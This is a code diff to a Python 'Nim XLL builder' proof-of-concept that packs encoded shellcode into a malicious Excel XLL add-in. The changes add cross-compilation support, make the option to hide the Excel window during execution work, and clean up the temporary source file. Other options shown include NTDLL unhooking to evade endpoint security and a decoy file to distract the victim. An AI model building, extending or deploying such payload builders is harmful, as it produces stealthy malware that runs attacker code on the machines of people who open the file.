@@ -17,9 +17,7 @@ banner = """
 (_/ \\_)\\__  |_|   \\____)_|_|\\_||_|
       (____/       Nim XLL builder PoC v0.2.1               
 """
-if os.name != 'nt':
-	print("| cross-compilation coming soon™")
-	exit(1)
+
 print(banner)
 def encode_shellcode(sc_bytes):
 	STATE_OPEN = "<"
@@ -94,7 +92,7 @@ compilation.add_argument("-n", "--skip-unhook", action="store_true",
 	help="do not do NTDLL unhooking")
 
 compilation.add_argument("-w", "--hidewindow", action="store_true",
-	help="hide excel window during execution # TODO")
+	help="hide excel window during execution")
 
 compilation.add_argument("-d", "--decoy", type=str,
 	help="path to the decoy file to open on startup (optional)")
@@ -121,6 +119,10 @@ with open("xll_template.nim", "r") as f:
 
 compile_template = "nim c --app:lib --passL:\"-static-libgcc -static -lpthread\" --hints:off --define:excel {cmdline_args} --nomain --out:{outfile} --threads:on {filename}"
 cmdline_args = ""
+if os.name != 'nt':
+	print("| cross-compilation unstable")
+	cmdline_args += "--define:mingw --cpu:amd64 "
+
 
 if not args.skip_unhook:
 	cmdline_args += "--define:unhook "
@@ -130,7 +132,7 @@ else:
 
 if args.hidewindow:
 	cmdline_args += "--define:hidewindow "
-	print("| hide excel window: TODO")
+	print("| hide excel window: on")
 else:
 	print("| hide excel window: off")
 
@@ -200,4 +202,5 @@ with open(tempname, "w") as f:
 if args.verbose:
 	print(" \\ command line:", compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename=tempname))
 os.system(compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename=tempname))
+os.remove(tempname)
 print("! should be saved to: ", args.output)
